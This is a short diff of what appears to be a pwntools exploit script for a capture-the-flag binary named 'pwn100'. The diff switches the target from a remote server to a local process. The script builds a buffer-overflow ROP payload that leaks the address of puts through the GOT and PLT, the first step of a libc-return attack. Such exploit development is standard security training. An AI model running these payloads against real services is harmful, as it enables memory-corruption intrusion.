@@ -2,8 +2,8 @@ from pwn import *
 
 elf = ELF("./pwn100")
 
-#sh = process("./pwn100")
-sh = remote("111.198.29.45",31504)
+sh = process("./pwn100")
+#  sh = remote("111.198.29.45",31504)
 
 payload = ("1"*0x48 + p64(0x400763) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x400550)).ljust(200)
 
